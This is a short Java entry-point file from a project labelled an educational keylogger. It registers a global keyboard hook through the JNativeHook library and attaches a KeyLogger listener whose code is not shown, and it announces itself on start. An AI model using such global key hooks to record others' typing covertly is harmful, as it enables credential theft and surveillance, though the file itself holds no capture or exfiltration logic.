package com.github.giorgosg1an;


import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

public class Main {
    public static void main(String[] args) {
        System.out.println("Educational Keylogger (Global) started. Press ESC to exit.");

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.err.println("Error registering native hook: " + e.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }
}